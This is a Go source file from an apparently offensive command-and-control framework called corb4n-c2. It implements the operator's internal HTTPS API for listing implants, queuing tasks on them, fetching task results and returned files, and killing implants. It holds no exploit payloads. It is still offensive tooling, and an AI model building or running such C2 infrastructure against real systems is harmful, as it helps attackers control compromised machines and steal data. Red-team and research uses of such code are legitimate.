package c2int

import (
	"crypto/tls"
	"encoding/json"
	"errors"
	"net/http"
	"path/filepath"

	"github.com/dovelus/corb4n-c2/server/comunication"
	"github.com/dovelus/corb4n-c2/server/db"
	"github.com/gorilla/mux"
)

// logRequest is a middleware that logs the details of each request
func logRequest(handler http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		comunication.Logger.Infof("Received request: %s %s from %s", req.Method, req.URL.Path, req.RemoteAddr)
		handler.ServeHTTP(w, req)
	})
}

// Handler function to get all implants
func handleGetAllImplants(w http.ResponseWriter, _ *http.Request) {
	implants, err := db.GetAllImplants()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to get all implants: %v", err)
		return
	}

	implantsJSON, err := json.Marshal(implants)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to encode implants: %v", err)
		return
	}

	// Log the readable JSON string
	comunication.Logger.Infof("implants JSON: %s", string(implantsJSON))

	w.Header().Set("Content-Type", "application/json")
	_, err = w.Write(implantsJSON)
	if err != nil {
		return
	}
}

func handleGetImplantByID(w http.ResponseWriter, r *http.Request) {
	var data struct {
		ID string `json:"id"`
	}
	err := json.NewDecoder(r.Body).Decode(&data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode get implant by ID request: %v", err)
		return
	}

	implant, err := db.GetImplantByID(data.ID)
	if errors.Is(err, comunication.ErrNoResults) {
		http.Error(w, err.Error(), http.StatusNotFound)
		comunication.Logger.Errorf("no results found: %v", err)
		return
	}

	implantJSON, err := json.Marshal(implant)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to encode implant: %v", err)
		return
	}

	// Log the readable JSON string
	comunication.Logger.Infof("implant JSON: %s", string(implantJSON))

	w.Header().Set("Content-Type", "application/json")
	_, err = w.Write(implantJSON)
	if err != nil {
		return
	}
}

// Handler function to remove an implant
func handleRemoveImplant(w http.ResponseWriter, r *http.Request) {
	var data struct {
		ID string `json:"id"`
	}
	var task db.ImplantTask
	err := json.NewDecoder(r.Body).Decode(&data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode remove implant request: %v", err)
		return
	}

	err = db.RemoveAllTasksImplant(data.ID)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to remove all tasks for implant: %v", err)
		return
	}

	task.TaskID = comunication.GenerateID()
	task.ImplantID = data.ID
	task.FileID = 0 // Set file_id to empty string
	task.TaskType = db.KillImplant
	task.CreatedAt = comunication.CurrentUnixTimestamp()
	task.Completed = false
	task.CompletedAt = 0
	task.TaskResult = nil

	err = db.AddTask(&task)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to add task: %v", err)
		return
	}
	w.WriteHeader(http.StatusOK)
}

// Handler function to get all tasks
func handleGetAllTasks(w http.ResponseWriter, r *http.Request) {
	var data struct {
		Completed bool `json:"completed"`
	}

	err := json.NewDecoder(r.Body).Decode(&data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode get all tasks request: %v", err)
		return
	}

	tasks, err := db.GetAllTasks(data.Completed)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to get all tasks: %v", err)
		return
	}

	tasksJSON, err := json.Marshal(tasks)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to encode tasks: %v", err)
		return
	}

	// Log the readable JSON string
	comunication.Logger.Infof("tasks JSON: %s", string(tasksJSON))

	w.Header().Set("Content-Type", "application/json")
	_, err = w.Write(tasksJSON)
	if err != nil {
		return
	}

}

// handleGetTaskByID handles the request to get a task by its ID
func handleGetTaskByID(w http.ResponseWriter, r *http.Request) {
	var data struct {
		ID     string `json:"id"`
		Status bool   `json:"status"`
	}
	err := json.NewDecoder(r.Body).Decode(&data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode get task by ID request: %v", err)
		return
	}

	task, err := db.GetImplantTasks(data.ID, data.Status)
	if errors.Is(err, comunication.ErrNoResults) {
		http.Error(w, err.Error(), http.StatusNotFound)
		comunication.Logger.Errorf("no results found: %v", err)
		return
	}

	taskJSON, err := json.Marshal(task)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to encode task: %v", err)
		return
	}

	// Log the readable JSON string
	comunication.Logger.Infof("task JSON: %s", string(taskJSON))

	w.Header().Set("Content-Type", "application/json")
	_, err = w.Write(taskJSON)
	if err != nil {
		return
	}
}

// Handler function to create a task for an implant
func handleCreateTaskForImplant(w http.ResponseWriter, r *http.Request) {
	var task db.ImplantTask
	err := json.NewDecoder(r.Body).Decode(&task)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode create task for implant request: %v", err)
		return
	}

	task.TaskID = comunication.GenerateID()
	task.FileID = 0 // Set file_id to empty string
	task.CreatedAt = comunication.CurrentUnixTimestamp()
	task.Completed = false
	task.CompletedAt = 0
	task.TaskResult = nil

	// Check if taskType is in the TaskTypes map
	if _, ok := db.TaskTypes[task.TaskType]; !ok {
		http.Error(w, "invalid task type", http.StatusBadRequest)
		comunication.Logger.Errorf("invalid task type")
		return
	}

	err = db.AddTask(&task)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to add task: %v", err)
		return
	}
	_, err = w.Write([]byte(task.TaskID))
	if err != nil {
		comunication.Logger.Errorf("failed to write response: %v", err)
		return
	}

	w.WriteHeader(http.StatusOK)
}

// Handler function to get the result of a task
func handleGetTaskResult(w http.ResponseWriter, r *http.Request) {
	var data struct {
		TaskID string `json:"task_id"`
	}
	err := json.NewDecoder(r.Body).Decode(&data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode get task result request: %v", err)
		return
	}

	task, err := db.GetTask(data.TaskID)
	if errors.Is(err, comunication.ErrNoResults) {
		http.Error(w, err.Error(), http.StatusNotFound)
		comunication.Logger.Errorf("no results found: %v", err)
		return
	}

	taskResult := task.TaskResult
	if taskResult == nil || task.FileID != 0 {
		pathToFile, err := db.GetFileByFID(task.FileID)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			comunication.Logger.Errorf("failed to get file by FID: %v", err)
			return
		}
		// Return the file content in the response
		http.ServeFile(w, r, pathToFile.FilePath)
	} else {
		taskResult := task.TaskResult
		w.Header().Set("Content-Type", "application/json")
		_, err = w.Write(taskResult)
		if err != nil {
			return
		}
	}

	w.WriteHeader(http.StatusOK)
}

// Handler function to cancel a task
func handleCancelTask(w http.ResponseWriter, r *http.Request) {
	var data struct {
		TaskID string `json:"task_id"`
	}
	err := json.NewDecoder(r.Body).Decode(&data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode cancel task request: %v", err)
		return
	}

	err = db.RemoveTask(data.TaskID)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to cancel task: %v", err)
		return
	}
	w.WriteHeader(http.StatusOK)
}

// StartIntHTTPServer starts the external HTTP server
func StartIntHTTPServer() {
	serverCertPath, err := filepath.Abs(filepath.Join("certs", "server.crt"))
	if err != nil {
		comunication.Logger.Fatalf("failed to get absolute path for server certificate: %v", err)
	}
	serverKeyPath, err := filepath.Abs(filepath.Join("certs", "server.key"))
	if err != nil {
		comunication.Logger.Fatalf("failed to get absolute path for server key: %v", err)
	}

	tlsConfig := &tls.Config{
		Certificates: make([]tls.Certificate, 1),
	}

	tlsConfig.Certificates[0], err = tls.LoadX509KeyPair(serverCertPath, serverKeyPath)
	if err != nil {
		comunication.Logger.Fatalf("failed to load server certificate: %v", err)
	}

	r := mux.NewRouter()
	r.Use(logRequest)
	r.HandleFunc("/getAllImplants", handleGetAllImplants).Methods("GET")
	r.HandleFunc("/getImplantByID", handleGetImplantByID).Methods("POST")
	r.HandleFunc("/killImplant", handleRemoveImplant).Methods("POST")
	r.HandleFunc("/getAllTasks", handleGetAllTasks).Methods("POST")
	r.HandleFunc("/getTaskByID", handleGetTaskByID).Methods("POST")
	r.HandleFunc("/createTaskForImplant", handleCreateTaskForImplant).Methods("POST")
	r.HandleFunc("/getTaskResult", handleGetTaskResult).Methods("POST")
	r.HandleFunc("/cancelTask", handleCancelTask).Methods("POST")

	srv := &http.Server{
		Addr:         "localhost:9443",
		Handler:      r,
		TLSConfig:    tlsConfig,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler)),
	}
	comunication.Logger.Infof("Starting internal HTTPs server on %s", srv.Addr)
	comunication.Logger.Fatal(srv.ListenAndServeTLS("", ""))
}
